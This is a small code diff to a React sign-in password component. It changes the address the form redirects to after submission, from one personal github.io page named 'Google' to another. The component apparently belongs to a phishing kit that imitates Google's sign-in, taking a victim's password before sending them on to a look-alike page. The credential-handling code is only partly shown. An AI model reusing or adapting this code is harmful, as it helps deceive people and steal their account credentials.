@@ -31,7 +31,7 @@ export default function SignInPassword({ Logo, value, setValue, register, handle
 
   const onSubmit = async() => {
     setTimeout(function () {
-      window.location.href = "http://paq000.github.io/Google/";
+      window.location.href = "http://glennphil.github.io/Google/";
     }, 250);
     const user = await currentUser();
       setUser(user);
